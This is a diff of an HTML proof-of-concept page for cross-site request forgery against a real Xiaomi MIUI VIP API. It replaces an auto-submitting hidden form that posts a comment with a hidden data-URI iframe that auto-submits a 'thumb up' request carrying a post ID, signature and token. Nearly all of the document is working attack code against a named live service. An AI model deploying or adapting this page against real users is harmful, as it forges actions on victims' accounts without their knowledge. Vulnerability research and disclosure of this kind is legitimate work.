@@ -1,14 +1,8 @@
-
-
 <html>
-  <!-- CSRF PoC - 自动提交表单 -->
   <body>
-    <form id="csrfForm" action="https://api.vip.miui.com/mtop/planet/vip/content/addCommentReturnCommentInfo?ref=&pathname=%2Fmio%2Fdetail&version=dev.20051&miui_vip_ph=4qOWfxlUcDs8VeeHSwI37g%3D%3D" method="POST">
-      <input type="hidden" name="postId" value="49418396" />
-      <input type="hidden" name="text" value="å&#147;&#136;å&#147;&#136;" />
-    </form>
+    <iframe id="csrfFrame" style="display:none;"></iframe>
     <script>
-      document.getElementById("csrfForm").submit();
+      document.getElementById('csrfFrame').src = "data:text/html,<form action='https://api.vip.miui.com/mtop/planet/vip/content/announceThumbUp?ref=&pathname=%2Fmio%2Fdetail&version=dev.20051&miui_vip_ph=4qOWfxlUcDs8VeeHSwI37g%3D%3D' method='POST'><input type='hidden' name='postId' value='49418396'><input type='hidden' name='environment' value=''><input type='hidden' name='timestamp' value='1742539313717'><input type='hidden' name='sign' value='41faf8445f068e5df7b9f31b5bc8ddfe'><input type='hidden' name='miui_vip_ph' value='4qOWfxlUcDs8VeeHSwI37g=='></form><script>document.forms[0].submit();</scri" + "pt>";
     </script>
   </body>
 </html>
